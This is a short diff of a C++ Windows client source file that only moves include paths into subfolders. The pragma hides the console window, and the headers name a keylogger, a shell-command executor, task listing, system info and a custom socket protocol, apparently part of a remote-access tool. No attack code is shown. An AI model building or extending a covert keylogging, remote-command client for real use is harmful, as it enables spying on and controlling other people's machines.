@@ -1,14 +1,14 @@
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 #include "../utils/EnvLoader.hpp"
-#include "../utils/LPTF_Socket.hpp"
-#include "../utils/PacketType.hpp"
-#include "../utils/LPTF_Packet.hpp"
-#include "../utils/SystemInfo.hpp"
-#include "../utils/TaskList.hpp"
-#include "../utils/NetworkInfoFactory.hpp"
-#include "../utils/KeyLogger.hpp"
-#include "../utils/BashExec.hpp"
+#include "../utils/LPTF/LPTF_Socket.hpp"
+#include "../utils/LPTF/LPTF_PacketType.hpp"
+#include "../utils/LPTF/LPTF_Packet.hpp"
+#include "../utils/SystemInfo/SystemInfo.hpp"
+#include "../utils/SystemInfo/TaskList.hpp"
+#include "../utils/NetworkInfo/NetworkInfoFactory.hpp"
+#include "../utils/SystemInfo/KeyLogger.hpp"
+#include "../utils/CommandSystem/BashExec.hpp"
 #include <iostream>
 #include <windows.h>
 #include <thread>
